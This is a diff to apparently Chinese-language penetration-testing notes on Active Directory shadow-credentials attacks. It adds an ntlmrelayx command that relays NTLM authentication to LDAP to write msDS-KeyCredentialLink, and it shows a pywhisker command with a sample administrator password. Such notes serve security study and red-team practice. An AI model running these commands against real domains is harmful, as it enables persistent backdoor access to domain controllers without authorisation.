@@ -371,7 +371,15 @@ python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yang
 
 > 用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。  
 > 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。
->
+
+```bash
+解决impacket报错
+python3 -m pip install .
+
+python3 ntlmrelayx.py --shadow-credentials  --shadow-target 'mssql$' -t ldap://10.10.10.10 --remove-mic
+```
+
+![image-20220223114929696](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223114929696.png)
 
 ### RBCD
 
